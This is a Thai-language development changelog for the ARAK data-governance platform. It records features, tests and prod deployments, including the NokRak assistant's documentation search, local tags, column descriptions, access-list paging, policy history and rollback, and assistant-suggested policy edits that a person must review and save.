- ไม่มีกฎความซับซ้อน (ตัวใหญ่/สัญลักษณ์) — ใช้ความยาวแทนตาม NIST 800-63B · ไม่มี password history
- **prod:** admin ที่ตั้งรหัสไว้ (must_change=true) จะเจอหน้า "Choose a new password" ตอน sign in ครั้งถัดไป — ต้องให้ผู้ใช้เปลี่ยนเอง **ห้าม agent เปลี่ยนรหัส admin บน prod**

## รอบก่อนหน้า — **ข้อ CF: NokRak ตอบคำถามวิธีใช้ ARAK จากคู่มือของระบบ (`search_docs` · M28)**

ผู้ใช้ขอ: *"ให้ NokRak มีข้อมูล Document ของระบบด้วย เผื่อ user ถาม"*

### CF.1 คู่มือ
- `docs/user-guide.md` (ใหม่ · ภาษาอังกฤษ) — แต่ละหัวข้อ `##` อ่านจบในตัว: sign in · เมนู · Catalog · หน้า table (Columns · Column descriptions · Edit tags · Access) · ขอสิทธิ์ · สถานะคำขอ · อนุมัติ · grant · policy (builder · lifecycle · history · การชนกัน · masking) · Query page · Query log · Dashboard · Governance (รวมการสร้าง classification / tag ใน ARAK) · Settings · NokRak · คำถามที่พบบ่อย
- บอกตรงๆ ว่า **ยังไม่มีหน้าเปลี่ยนรหัสผ่านเอง** (M2) — ทำหน้านั้นแล้วต้องแก้คู่มือด้วย

### CF.2 Backend
- `pom.xml` `<resources>` แพ็ก `docs/user-guide.md` · `policy-conflict-resolution.md` · `policy-spec.md` เข้า jar ใต้ `help/` → ข้อความที่คนอ่านกับที่ NokRak quote เป็นไฟล์เดียวกัน · `deploy/start.sh` ใส่ 3 ไฟล์นี้ใน stamp (แก้คู่มือแล้ว prod build ใหม่เอง) · `deploy/Dockerfile` `COPY docs/`
- `llm/HelpDocs.java` — ตัดแต่ละไฟล์ตามหัวข้อ `##` (หัวข้อใน code fence ไม่นับ · `###` อยู่ในหัวข้อแม่) · ค้นแบบ keyword ไม่ใช้ model: ตัด stop word · คำ ASCII ≥ 3 ตัว (ไทย ≥ 2) · ตัดท้ายคำอังกฤษ (`change`/`changes` → `chang` เจอ "changing" · `policy`/`policies` → `polic`) · match แบบ substring (คำไทยเจอในข้อความไทยที่ไม่มีช่องว่าง) · คะแนน = ความหายากของคำ × (อยู่ในหัวข้อ ×6 + จำนวนครั้ง ≤ 5) × จำนวนคำที่เจอ · คืน ≤ 3 หัวข้อ หัวข้อละ ≤ 4000 ตัวอักษร · ไม่เจอ = รายชื่อหัวข้อของคู่มือให้ลองคำอื่น แล้วให้บอกว่าคู่มือไม่ครอบคลุม · jar ไม่มีไฟล์ = error ให้บอกว่าค้นไม่ได้
- `AgentPrompts` — tool `search_docs` **ให้ทุกคนเสมอ ไม่ผูก feature** (คู่มือไม่ใช่ข้อมูลของใคร) · กติกาใน system prompt: ถามเรื่องการใช้ ARAK → เรียก `search_docs` ด้วย keyword อังกฤษ ตอบจากหัวข้อที่ได้ในภาษาของคนถาม · **ห้ามอธิบายแอปจากความรู้ทั่วไป** · คู่มือไม่มี = บอกว่าไม่มี
- `AssistToolbox` — `search_docs` คืน text ไม่มี card

### CF.3 Test
- `HelpDocsTest` 10 · `AgentPromptsTest` (tool list · prompt) · `AssistToolboxTest` (อ่านคู่มือจาก jar จริง) · backend unit **596 ผ่าน**
- probe กับคู่มือจริง 20 คำถาม ขึ้นหัวข้อที่ถูกเป็นอันดับแรกทุกข้อ เช่น request access → *Asking for access* · why column masked → *Masking functions* · change password → *Signing in and your account* · policy conflict deny → *How policies combine* · column description → *A table's page* · new classification → *Governance vocabulary and local tags* · policy history restore → *Policy history, compare and restore*

### CF.4 ที่ยังไม่ทำ (ตั้งใจ)
- ค้นแบบ keyword ไม่ใช่ embedding — คำถามภาษาไทยพึ่ง model แปลเป็น keyword อังกฤษก่อน (สั่งไว้ใน tool description) · เอกสาร policy 2 ไฟล์เป็นภาษาไทย ค้นด้วยคำไทยได้

## รอบก่อนหน้า — **ข้อ CE: สร้าง classification และ tag ของ ARAK เองได้ในหน้า Governance (FR-1.7 · provenance `local`)**

ผู้ใช้ขอ: *"Governance ให้สามารถเพิ่มฝั่ง Arak ได้ด้วย"* แล้วตอบว่า *"เป็นแบบ local"* — **ทำเฉพาะ classification + tag** เพราะเป็นของที่ *Edit tags* ติดลง table/column และที่ policy selector อ่าน · **glossary / domain / data product ยังสร้างได้ที่ OpenMetadata อย่างเดียว** (ไม่มีทางติดใน ARAK จึงยังไม่มีประโยชน์) · **ไม่เขียนกลับเข้า OM**

### CE.1 Backend
- `V41__local_vocabulary.sql` — `classification.created_by` · `tag.created_by` · ตาราง append-only `audit_vocabulary` (CREATE / UPDATE · CLASSIFICATION / TAG · before / after jsonb)
- `catalog/LocalVocabularyStore.java` — แถวที่สร้างเป็น `provider 'user'` `provenance 'local'` · ชื่อซ้ำเช็คแบบไม่สนตัวพิมพ์ (`Retention` กับ `retention` ชนกัน → 409) · tag ต้องอยู่ใต้ classification ที่มีจริงและไม่ disabled (**ใต้ classification ของ OM ได้** เช่น `PII.Payroll`) · แก้ได้เฉพาะแถว `local` (ของ OM → 400 *"comes from OpenMetadata; change it there"*) · แก้ได้ display name · description · disabled — **ชื่อแก้ไม่ได้** เพราะ policy กับ column ที่ติด tag อ้างด้วยชื่อ · แก้แล้วไม่มีอะไรเปลี่ยน = ไม่เขียน audit
- `resources/LocalVocabularyResource.java` — `GET /v1/local-vocabulary` → `{canEdit}` · `POST /classifications` · `POST /tags` (201) · `PUT` (field ที่เป็น null = คงเดิม · display name ว่าง = ลบ) · **ต้องเป็น Platform Admin หรือ Policy Author** (vocabulary ใช้ทั้งองค์กร policy ไหนก็อ้างได้ — ไม่ใช่สิทธิ์ของเจ้าของ table ตัวเดียว · การติด tag ยังเป็นของคนที่ govern table ผ่าน `LocalTagResource` เหมือนเดิม) · ชื่อ = FQN segment เดียว: ห้ามจุด · ห้าม `"` · ห้าม control char · ต้องมีตัวอักษรหรือตัวเลข · ≤ 64 ตัว (ภาษาไทยได้) · description บังคับ ≤ 2000 · `23505` (สองคนสร้างพร้อมกัน) → 409
- **sync ไม่ทับ**: `GovernanceStore` upsert/ลบเฉพาะแถว `provenance='openmetadata'` อยู่แล้ว — ถ้าวันหนึ่ง OM สร้างชื่อเดียวกัน แถว local ยังอยู่
- tag ที่ disabled ติดใหม่ไม่ได้ (`LocalTagStore.checkTag` เดิม) แต่ที่ติดไว้แล้ว **ยังบังคับใช้ต่อ** จนกว่าคนดูแล table จะถอด · ข้อความ *"No tag X in the catalog"* บอกให้ไปสร้างใน OM **หรือใน Governance ที่นี่**

### CE.2 Frontend
- `pages/governance/VocabularyEditor.tsx` (ใหม่) — ฟอร์มเดียวสามโหมด *New classification* · *New tag under X* · *Edit X* · บอกล่วงหน้าว่าจะได้ FQN อะไร (*It becomes Retention.Long*) · เช็คชื่อที่มีจุด / `"` / ยาวเกินก่อนส่ง · checkbox *One tag per column or table (mutually exclusive)* · *Disabled* อธิบายว่าที่ติดไว้แล้วยังอยู่และ mask ยังมีผล · สำเร็จแล้ว invalidate ทั้ง `['governance-vocabulary']` (หน้านี้) และ `['vocabulary']` (ตัวเลือกของ Edit tags) → ไม่ต้อง reload
- `GovernancePage.tsx` — ปุ่ม **New classification** · ปุ่ม **Add tag** บนแถว classification (ของ OM ก็มี) · ปุ่ม **Edit** เฉพาะแถวที่สร้างใน ARAK · badge **made in ARAK** · ข้อความสำเร็จบอกขั้นต่อไป (*Attach it to a column from the table's Columns tab, with Edit tags*) · ปุ่มแก้ไขขึ้นเฉพาะ tab Classifications & tags และเฉพาะคนที่ `canEdit`

### CE.3 Test
- `LocalVocabularyResourceTest` 7 · `GovernancePage.test.tsx` 6 (คนอ่านไม่เห็นปุ่ม · สร้าง classification + ชื่อมีจุดถูกกันก่อนส่ง · tag ใต้ PII ของ OM · Edit เฉพาะของ local + disable · server ปฏิเสธแล้วคงค่าที่พิมพ์ · tab อื่นไม่มีปุ่ม)
- jest รวม **714 ผ่าน** (72 suites) · tsc ผ่าน · backend unit **585 ผ่าน**
- **E2E local** (`scratchpad/vocab_e2e.py` · **ALL PASSED 24 ข้อ**): ไม่ login 401 · admin canEdit · สร้าง `Retention` (exclusive) · `Retention.Short` · `PII.Payroll` · `retention` ซ้ำ 409 · classification ไม่มีจริง 404 · ชื่อมีจุด 400 · แก้ `PII` ของ OM 400 · หน้า Governance เห็นเป็น local ใต้ parent ถูกต้อง · ติด `Retention.Short` ที่ `full_name` ผ่าน local-tags · disable → ติดใหม่ 400 แต่ที่ติดแล้วยังอยู่ · enable คืน · **sync OM จริงแล้ว** `Retention` / `PII.Payroll` ยังอยู่ และ `PII` ยังเป็นของ OM · `audit_vocabulary` 5 แถว (CREATE ×3 · UPDATE ×2 · no-op ไม่บันทึก)
- ภาพจาก browser จริง (bundle ที่ :8080/Arak): ปุ่มครบ · ไม่มี page error · Columns tab เห็น chip *Retention / Short* ARAK

### CE.4 ที่ยังไม่ทำ (ตั้งใจ)
- ลบ classification / tag ไม่ได้ — ใช้ *Disabled* แทน (policy เก่าอาจอ้างชื่ออยู่ · ลบแล้ว column ที่ติดไว้กลายเป็นไม่มีการคุ้มครองเงียบๆ)
- glossary / term / domain / data product แบบ local · ปุ่ม push กลับเข้า OM (ต้องได้ OK จากผู้ใช้ก่อนเขียน OM ของทีม)

## รอบก่อนหน้า — **ข้อ CD: Column description เขียนใน ARAK ได้ · NokRak ช่วยร่าง · แสดงใน Access Request ticket**

ผู้ใช้ขอ: *"Description ของ Colume ยังไม่เห็นมีมาเลย รวมถึงต้องแสดง ให้ดูใน Access Request Ticket ด้วย"* · *"ทำ Column description ให้เสร็จ แล้วเอาขึ้น prod เลย จะไปนำเสนอผู้บริหารพรุ่งนี้"* · *"สามารถเพิ่ม DEscription เองที่ Arak ได้ ด้วย"* · และ *"Edit tag มีอะไรข้างหน้าเกินมา"*

### CD.1 Backend
- `V40__column_description.sql` — `column_description` (key = FQN ของ column เหมือน `local_tag` · `assisted` บอกว่าเริ่มจากร่างของ NokRak · `written_by` / `written_at`) + `audit_column_description` append-only (SET / CLEAR · before / after)
- **ของ ARAK ชนะของ OM เมื่อมีทั้งคู่** (เขียนทีหลังและตั้งใจ) · crawl เขียนทับ `asset_column.description` ของ OM เท่านั้น ไม่แตะตารางนี้
- `ColumnDescriptionResource` — `GET /v1/column-descriptions?asset=` → `{canEdit, descriptions}` · `PUT` หลาย column ในครั้งเดียว (≤ 2000) ว่าง = ลบ · คืน `set / cleared / unchanged` · **คนที่ govern table** (`Stewardship.governs` — สิทธิ์เดียวกับติด tag) · ไม่ต้องใส่เหตุผล (description ไม่ได้ตัดสินสิทธิ์) แต่เก็บค่าเดิมใน audit
- `CatalogQuery` ใช้ description ที่มีผล (ARAK ก่อน แล้ว OM) · `AccessReview` ใส่ `description` ให้ทุก column ใน ticket review
- NokRak `POST /v1/llm/assist/describe-columns` (feature ใหม่ **Describe columns** ใน `LlmFeatureStore` ปิด/เปิดได้) — ร่างจากชื่อ + type ของ column เท่านั้น (**metadata only ไม่ส่งข้อมูลจริง**) ≤ 40 column ต่อครั้ง · ภาษาเลือกได้ · **ไม่บันทึกเอง** คนต้องอ่าน แก้ แล้วกด Save

### CD.2 Frontend
- Columns tab: ปุ่ม **Describe columns** (คนที่ govern) → แก้ทุก column ในที่เดียว + *Draft with NokRak* · description ขึ้นใต้ชื่อ column พร้อมป้าย ARAK · ช่องค้น column ค้นใน description ด้วย · บรรทัดสรุป *N described*
- Access Request ticket (`RequestReview`) — ใต้ชื่อ column มี description (2 บรรทัด + tooltip เต็ม) คนอนุมัติไม่ต้องตัดสินจากชื่ออย่างเดียว
- แก้ *"—Edit tags"* ที่มีขีดเกินข้างหน้า

### CD.3 Test
- `ColumnDescriptionResourceTest` 6 · `LlmAssistResourceTest$DescribeColumns` 6 · `AccessReviewTest` (description ใน review) · `AssistToolboxTest` · `ColumnsTab.test.tsx` 9 · `AssetDetailPage.test.tsx` · `AccessRequestsPage.test.tsx`
- E2E local: เขียน description ของ `full_name` → set 1 · อ่านกลับได้ · เห็นใต้ชื่อ column ใน browser

## รอบก่อนหน้า — **ข้อ CC: tab Access ของ table รับ list ยาวๆ ได้ (FR-7.3)**

ผู้ใช้ขอ: *"หน้า Access ของ Table ให้คิดเผื่อกรณีมี list เยอะมากๆ ด้วย ตอนนี้มันต้อง Scroll bar ลงมาเยอะมาก ดูไม่ดี และไม่ยืดหยุ่น"* และต่อมา *"มันแสดงชื่อไม่เต็ม ชื่อ group ก็ไม่เต็ม … ควรจะกดเข้าไปดูรายละเอียดได้ไหม"* — **ไม่มี API ใหม่** ข้อมูลยังมาจาก `GET /v1/access/assets/{fqn}` ครั้งเดียวเหมือนเดิม การกรอง ค้น และแบ่งหน้าทำในเบราว์เซอร์ทั้งหมด (`accessLists.ts` เป็น pure helper แยกจาก component เพื่ออ่านกติกาการนับและ test ได้โดยไม่ render)

### CC.1 แถบสรุปบนสุด (`Access at a glance`)
- ตัวเลขที่กดได้: *N grants in force* · *N overruled* (สีเตือน) · *N not started* · *N expired* · *N can read now* (+ *(of N checked)* เมื่อคนถูก sample) · *N see less than all* — กดแล้ว list ข้างล่างถูกกรองให้ตรงตัวเลขนั้นและเลื่อนลงไปที่ section
- ลิงก์กระโดด: Grants · How it is decided · Who can read · Outside ARAK

### CC.2 Direct grants — บรรทัดละ grant แทน card สูง
- หนึ่งบรรทัด: ชื่อ (principal เป็นบรรทัดที่สองถ้ามี display name) · ป้ายสถานะ · ช่วงเวลา · เหตุผล · *lets N in* · เมนู **⋯** (Edit / Revoke)
- **สถานะเดียวต่อ grant** จึงรวม chip แล้วได้เท่ากับทั้ง list: *In force* · *Overruled* (window เปิดอยู่แต่ policy ชั้นนอกปฏิเสธทุกคน — ไม่เรียก overruled ถ้า asset ไม่อยู่ใน catalog cache เพราะไม่มีใครถูก evaluate) · *Not started* · *Expired* · chip กรองพร้อมจำนวน · **default ซ่อน Expired** (table ที่ดูแลมาเป็นปีส่วนใหญ่คือประวัติ) · เรียง Overruled ก่อน แล้ว In force → Not started → Expired · grant ที่ revoke แล้วไม่ถูกส่งมาอยู่แล้ว (ดูใน tab Audit)
- ค้นหา: ชื่อ · display name · เหตุผล · คนให้ (ไม่สนตัวพิมพ์เล็กใหญ่) · ไม่เจอ → *No grant here matches.* + ปุ่ม *Show all N*
- แบ่งหน้า 10 / 25 / 50 / 100 · บอก *1–10 of 34* · ไม่ถึงหน้าเดียวไม่มี pager · กรองจน offset เกินท้าย → ดึงกลับหน้าสุดท้าย ไม่มีหน้าว่าง
- **กดชื่อหรือเหตุผล → รายละเอียดเต็ม** (ผู้ใช้ขอ): ชื่อเต็ม · principal · source · ช่วงเวลาถึงนาที · เหตุผลทั้งข้อความ (ขึ้นบรรทัดใหม่ได้) · ใครให้ เมื่อไหร่ · **Lets in** = รายชื่อคนที่ grant นี้พาเข้ามาได้จริง (อ่านจาก `viaGrants` ของ people list ที่มีอยู่แล้ว ไม่ยิง API เพิ่ม) แสดงสูงสุด 30 ชื่อ ที่เหลือบอกให้ค้นใน *Who can read this now* — grant ให้ group จึงตอบได้ว่า "ใครในนั้นได้เข้า" · not started / expired / overruled / asset ไม่อยู่ใน cache บอกเหตุผลแทนรายชื่อ · ชื่อยาวมี tooltip `ชื่อ (principal)`
- grant ที่ **ยังไม่เริ่ม** แก้ / revoke ได้แล้ว (server รับอยู่แล้ว) · grant ที่หมดแล้วไม่มีเมนู · คำอธิบายของ Overruled ยังอยู่ใต้บรรทัดเสมอ เพราะเป็นแถวที่ดูเหมือนมีสิทธิ์ที่สุดแต่ไม่มี

### CC.3 Who can read this now
- ค้นหา: principal · ชื่อ policy · principal ของ grant ที่พาเข้ามา (ค้นด้วย id ของ grant ไม่เจอ — ไม่มีใครพิมพ์ id)
- chip ที่มา: *Everyone* · *Direct grant* · *Via policy* · *Grant and policy* — คนที่ได้ทั้งสองทางนับอยู่ในทั้ง Direct grant และ Via policy (*Grant and policy* คือคำถาม "revoke grant แล้วใครยังเข้าได้")
- checkbox *Only those who see less than all* · แบ่งหน้า 25 / 50 / 100

### CC.4 Code + test
- ใหม่ `frontend/app/src/pages/catalog/accessLists.ts` + `accessLists.test.ts` · `AccessTab.tsx` เขียนใหม่ (`SummaryStrip` · `GrantList` · `GrantRow` · `GrantDetails` · `PeopleList` · `ListFooter`) · `Pager` รับ `sizes` (default เดิม)
- `AccessTab.test.tsx`: เมนู ⋯ (Edit / Revoke ต้องมีเหตุผล) · รายละเอียดจากชื่อและจากเหตุผล · group แสดงเต็ม + Lets in เฉพาะสมาชิกที่เข้าได้ · not started มีเมนู / expired ไม่มี · 14 grant: overruled ก่อน · หน้า 2 · chip Expired · ค้น · Show all · แถบสรุปกรอง · 33 คน: หน้า · chip ที่มา · ค้นด้วยชื่อ grant · restricted only
- jest รวม **699 ผ่าน** · tsc ผ่าน

### CC.5 ที่ยังไม่ทำ (ตั้งใจ)
- ไม่แบ่งหน้าที่ server — คำตอบเดียวมีทุก grant และทุกคนที่ถูก evaluate (people ถูก sample อยู่แล้วเมื่อเยอะ) · ถ้า grant ต่อ table ถึงหลักพัน ค่อยย้าย paging ไป server
- ไม่แสดงสมาชิกทั้งหมดของ group (รวมคนที่ policy ปฏิเสธ) — Lets in แสดงเฉพาะคนที่เข้าได้จริง

## รอบก่อนหน้า — **ข้อ CB: NokRak ช่วยแก้ policy ที่มีอยู่ (M28b) — แนะนำได้ แต่คนต้อง review แล้วกด Save เอง**

ผู้ใช้ขอ: *"NokRak Help me ตอนนี้มีตอนสร้าง Policy ใหม่ ให้เพิ่มตอนแก้ไขด้วย สามารถช่วยแก้ไขได้ แต่ต้องรอคน Review save เหมือนเดิม"* — ปุ่มเดิมบนหน้า New policy ตอนนี้อยู่บนหน้า **Edit** ด้วย และเส้นทางยังเหมือนเดิมทุกอย่าง: NokRak เปลี่ยนแค่ form บนจอ ไม่มีอะไรถูกบันทึก ไม่มีอะไร activate จนกว่าคนจะกด Save

### CB.1 API — `POST /v1/llm/assist/policy` รับ `current` เพิ่ม
- body `{intent, sourceId?, model?, current?}` · ไม่ส่ง `current` = ร่างใหม่เหมือนเดิม · ส่ง `current` (policy document เป็น JSON string) = **แก้ใบนั้น** ตอบเป็น document ทั้งใบที่แก้แล้ว
- server ตัดช่องที่เป็นของ store ออกก่อนส่งให้ LLM: `id · version · lifecycleState · updatedAt · updatedBy` (`AssistPrompts.policyForEdit`) — model จึงไม่เห็นชื่อคนแก้ และไม่มีช่องให้มัน "activate" อะไรได้
- `current` ที่ไม่ใช่ JSON / ไม่ใช่ object / ว่าง / ยาวเกิน 50,000 ตัวอักษร → **400 ก่อนถึง LLM** (ไม่เสียโควตา gateway)
- prompt แยก (`policyEditSystem` / `policyEditUser`): ตอบเป็น policy ทั้งใบเป็น JSON ใบเดียว · เปลี่ยนเฉพาะที่ขอ ที่เหลือคงเดิมทุกช่อง · ชื่อคงเดิมเว้นแต่ขอเปลี่ยน · ห้ามเขียน id / version / lifecycleState / updatedAt / updatedBy · schema ชุดเดียวกับตอนร่าง
- สิทธิ์เหมือนตอนร่างทุกอย่าง: `DRAFT_POLICY` ของ role (V29) · metadata เท่านั้น · endpoint คืนข้อความ ไม่เก็บอะไร · ตอบไม่เป็น document → 503 "did not answer with the changed policy"

### CB.2 หน้าจอ — หน้า Edit ของ policy
- ปุ่ม **NokRak, help me** บนหัวหน้า Edit (ไม่ขึ้นกับ policy ARCHIVED · ไม่ขึ้นถ้า role ไม่มีงาน DRAFT_POLICY) → ช่อง *Tell NokRak what to change* + ปุ่ม **Suggest it** · ส่ง form **ตามที่เห็นบนจอตอนนี้** (รวมที่แก้มือแล้วแต่ยังไม่ save)
- policy ACTIVE: บอกก่อนกดว่า *Save puts the change in force straight away*
- ได้คำตอบ → form เปลี่ยนตาม + panel **NokRak's suggestion**: "NokRak suggests N changes" ตาราง *Before | Suggested* เฉพาะช่องที่ต่าง (ใช้ `policyDiff.ts` ตัวเดียวกับ History) · ACTIVE มีคำเตือนซ้ำใน panel · ปุ่ม **Undo the suggestion** (กลับไปเป็น form ก่อน NokRak แตะ — ถามซ้ำกี่รอบก็เทียบกับ "ก่อน" ตัวแรก) · **Keep editing** · คำตอบที่ไม่เปลี่ยนอะไร → "NokRak's answer changes nothing" + Close
- **Save เป็นทางเดียวที่ถึง store** — `updatePolicy(id, doc, expectedVersion)` ตัวเดิม (409 ถ้ามีคนแก้ก่อน · lifecycleState / version จากคำตอบถูกตัดทิ้งก่อน) · ไม่เรียก transition · ลงชื่อคนกด Save ใน History ตามปกติ
- test: backend +8 (`AssistPromptsTest$PolicyEdit` 4 · `LlmAssistResourceTest$PolicyEdit` 4) → unit 565 ผ่าน · jest +4 (`NokRak, help me, on a policy that exists`) → 677 ผ่าน
- E2E local: ไม่ login 401 · `current` ไม่ใช่ JSON / array / ยาวเกิน → 400 ×3 · แก้ ALLOW → DENY ได้ 200 (ชื่อคงเดิม · ไม่มี id / lifecycleState) · จำนวน policy ใน store เท่าเดิม
- **prod** (commit 8888afa): bundle มีปุ่มบนหน้า Edit · E2E ชุดเดียวกันผ่านบน prod (401 · 400 ×3 · 200 ได้ DENY) · ไม่มีอะไรถูกเก็บ (จำนวน policy เท่าเดิม)

### CB.3 ที่ยังไม่ทำ (ตั้งใจ)
- NokRak ไม่ส่ง diff/patch — ตอบทั้งใบ เพื่อให้ validate ด้วย schema เดียวกับตอนร่าง และหน้าเว็บเทียบเองด้วย `policyDiff`
- ไม่มีปุ่ม "ใช้แล้ว save เลย" — ตั้งใจ ตาม FR-2.6 / กติกา LLM ไม่ apply เอง

## รอบก่อนหน้า — **ข้อ CA: ประวัติ policy — History · diff · rollback (M17 · FR-9.2 · FR-8.1)**

ปิดทั้ง 5 ข้อของ AP.5 — ประวัติที่เก็บอยู่ใน `policy_version` ตั้งแต่ V3 ถูกอ่านกลับขึ้นจอได้แล้ว และ `audit_policy_change` มีคนเขียนจริงเป็นครั้งแรก

### CA.1 Change log (`audit_policy_change` · V39)
- `PolicyStore` เขียน log **หนึ่งแถวต่อทุกเวอร์ชัน ใน transaction เดียวกับ `policy_version`** — create · update · lifecycle · rollback (ก่อนหน้านี้ตารางมีแต่ว่างเปล่า — M8 row เดิมเขียนว่า "เขียนจริงแล้ว" ซึ่งไม่ถูก)
- V39: เพิ่ม `from_state` / `to_state` (publish ไม่แตะ document สักช่อง ถ้าไม่มีสองช่องนี้ log ของการ publish คือ document สองใบที่เหมือนกัน) · `restored_from` (rollback คือเวอร์ชันใหม่ ไม่ใช่แก้ของเก่า ที่นี่จึงเป็นที่เดียวที่รู้ว่า v7 คือ v4 ที่เอากลับมา) · action เพิ่ม `SUBMIT` (ส่งขออนุมัติ) / `RETURN` (ตีกลับ) · index `(policy_id, to_version)`
- action ของ lifecycle: `DRAFT→PENDING_APPROVAL` = SUBMIT · `PENDING_APPROVAL→DRAFT` = RETURN · `→ACTIVE` = PUBLISH · `→DISABLED` = DISABLE · `→ARCHIVED` = ARCHIVE · เวอร์ชันเก่าที่ไม่มีแถว log ถูกอ่านเป็น CREATE (v1) / UPDATE
- เก็บ `client_ip` จาก `request.getRemoteAddr()` เท่านั้น (ไม่อ่าน `X-Forwarded-For`) · **ไม่ออกไปกับคำตอบไหนเลย** — history ไม่ SELECT คอลัมน์นี้ เป็นของ auditor ที่อ่านจาก DB

### CA.2 API
- `GET /v1/policies/{id}/versions` → ทุกเวอร์ชันใหม่สุดก่อน: `version · document · lifecycleState · changedBy · changeReason · changedAt · action · restoredFrom` (เดิม `change_reason` ถูก SELECT มาแล้วทิ้ง) · อ่านได้เท่าที่อ่าน policy ได้
- `GET /v1/policies/{id}/versions/{v}/impact` → ถ้าเอา v กลับมา ใครเห็นอะไรเปลี่ยน · **selector ของเวอร์ชันเก่าถูก resolve ใหม่กับ estate ตอนนี้** (binding ของมันไม่อยู่แล้ว) · วัดสองฝั่งเป็น ACTIVE เสมอ แต่ `candidateActive` บอกว่า policy อยู่ในผลจริงไหม · v ปัจจุบัน → 400
- `POST /v1/policies/{id}/rollback/{v}` body `{expectedVersion, reason}` → เขียน **v(n+1) ที่ document เหมือน v ทุกตัวอักษร** · state ไม่เปลี่ยน (ACTIVE ยัง ACTIVE — ผลเกิดทันที) · reason บังคับ · `expectedVersion` ไม่ตรง = 409 (มีคนแก้ก่อน) · ARCHIVED = 409 · ไม่มีเวอร์ชันนั้น = 404 · สิทธิ์ตรวจกับ **ทั้ง document ปัจจุบันและ document เก่า** (data owner เอา scope ของคนอื่นกลับมาไม่ได้) · re-materialize binding ทันที
- test: `PolicyHistoryIT` 15 (Log 5 · History 3 · Rollback 7) · `ImpactAnalysisIT$Rollback` 3 (rule แคบลง = ได้สิทธิ์คืน · selector เก่าถูก resolve ใหม่ · draft อ่านเป็นอนาคต) · `PolicyStoreIT` 12 · IT รวม 38 ผ่าน · unit 557 ผ่าน

### CA.3 หน้าจอ — tab **History** บนหน้า policy
- แถวละเวอร์ชัน: `v3` · ป้าย *created / edited / sent for review / sent back / activated / disabled / archived / restored* · "a copy of v1" · state · ใคร · เมื่อไหร่ · เหตุผล · ป้าย *current*
- **Compare with now** → ตารางสองคอลัมน์ *Now (v3)* | *v1* เฉพาะส่วนที่ต่าง อ่านเป็นประโยคเดียวกับหน้า policy (`policyDiff.ts` — เทียบที่ความหมาย: ลำดับ key · false ที่สะกดออกมา · list ว่าง ไม่นับเป็นความต่าง · ถ้าประโยคสองฝั่งเหมือนกันแต่ค่าต่าง เช่น `includeSuggested` ถอยไปโชว์ JSON ดิบ)
- **Restore v1** → policy ACTIVE: แสดง impact ก่อน ("Restoring v1 would change what 2 people see on 1 table.") · ไม่ ACTIVE: บอกว่าไม่มีใครได้รับผลจนกว่าจะ activate และไม่ยิง impact · ช่อง **Why** บังคับ · ปุ่มยืนยันกดได้เมื่อมีเหตุผล · ถูกปฏิเสธ → "The restore was refused." ฟอร์มยังเปิดอยู่
- เวอร์ชันที่อ่านเหมือนปัจจุบัน → "nothing to put back" ไม่มีปุ่ม · policy ARCHIVED → ดูประวัติได้แต่ไม่มีปุ่ม restore
- **หัวหน้า policy บอกว่าเวอร์ชันนี้แก้ล่าสุดเมื่อไหร่ โดยใคร** (ผู้ใช้ขอ): ช่อง Version อ่าน `v3 · active` + บรรทัด `edited <วัน เวลา> by <ใคร>` · หน้า **Edit** ข้างป้าย `v3 · ACTIVE` มี `edited … by … · History` (ลิงก์ไป `?tab=history`) — ใช้ `updatedAt` / `updatedBy` ที่มากับ policy อยู่แล้ว ไม่มี API ใหม่
- `policyDiff.test.ts` 9 · `PolicyDetailPage.test.tsx` +7 · `PolicyBuilderPage.test.tsx` +1 (หน้า edit ของ policy ที่มีอยู่ — test แรกของ route นี้ · mock `fetchVocabulary` แก้ให้ตรง shape จริง `classifications/glossaries/customProperties` และ governance mock ใช้ helper ตัวจริง) · jest รวม 673 ผ่าน
- E2E local (`history_e2e`): create 201 → update v2 → stale 409 → impact 200 → rollback ไม่มีเหตุผล 400 · stale 409 · ไม่มีเวอร์ชัน 404 → rollback 200 = v3 DRAFT ที่ document เท่ากับ v1 ทุกตัวอักษร · versions: ROLLBACK from=1 · ไม่มี client ip ในคำตอบ · ไม่ login = 401
- **prod** (commit 5576560): V39 ลงแล้ว · bundle มีข้อความ History / Restore · E2E ชุดเดียวกันผ่านหมดบน prod · policy ทดสอบ DRAFT ทิ้งไว้บน prod (ไม่ disable / archive / ลบ ตามกติกา demo)

### CA.4 ที่ยังไม่ทำ (ตั้งใจ)
- เทียบสองเวอร์ชันเก่าด้วยกันเอง (ตอนนี้เทียบกับ *ปัจจุบัน* เท่านั้น ซึ่งเป็นคำถามก่อน restore)
- หน้า auditor ที่อ่าน `audit_policy_change` ข้าม policy ทั้งหมด (ข้อมูลพร้อมแล้ว) — ไปกับ M8
- การ resolve binding ใหม่เฉยๆ (ไม่แก้ document) ยังไม่ลง change log

## รอบก่อนหน้า — **ข้อ BZ: Concurrency limit + cost guard ของ Query API (FR-6.3 · M7 ครบทุกข้อ)**

ของสองอย่างสุดท้ายใน FR-6.3 — กัน source ไม่ให้ถูก ARAK ยิงจนล่ม ทั้งจาก "ยิงพร้อมกันเยอะเกิน" และ "statement เดียวที่หนักเกิน"

### BZ.1 Concurrency limit (`QueryAdmission` ใน `dac-service/policy`)
- เพดานสามชั้น เช็คตามลำดับ **คน → source → ทั้ง service** · default 2 ต่อคน · 4 ต่อ source · 16 ทั้ง ARAK · รอได้ 3 วินาทีถ้าเต็ม แล้วค่อยตอบว่าไม่ว่าง
- **กิน slot เฉพาะ read ที่ไปถึง source จริง** — ผลจาก result cache และการถูก policy ปฏิเสธไม่กิน slot (lookup / decide / rewrite เกิดก่อน admission)
- slot ถูกคิดกับ **คนที่ส่ง** (`runBy`) ไม่ใช่คนที่ถูก preview แทน — steward กด View as user รัวๆ ไม่ไปกินโควตาของ analyst · ชื่อคนเทียบแบบไม่สนตัวพิมพ์
- เต็ม → `429 Too Many Requests` + header `Retry-After` + body `{message, busy: true, retryAfterSeconds}` · ลง `audit_query` เป็น `REJECTED` เหตุผลขึ้นต้น "Too many … running …" → หมวด **BUSY** ในหน้า refusal breakdown (**ไม่เพิ่ม outcome ใหม่** — ไม่ต้อง migrate และ dashboard เดิมนับถูกอยู่แล้ว)
- ต่อ process (in-memory) — ถ้า scale หลาย instance เพดานรวมจะคูณตามจำนวน instance

### BZ.2 Cost guard (`CostEstimate` ใน `dac-connector-source` + `QueryCostGuard`)
- ก่อนยิงจริง ถาม planner ของ source ว่า statement นี้ **รวม row cap แล้ว** แพงเท่าไร — PG: `EXPLAIN (FORMAT JSON)` ของ statement ที่ห่อ `LIMIT` · SQL Server: `SET ROWCOUNT` + `SET SHOWPLAN_XML ON` อ่าน `StatementSubTreeCost`
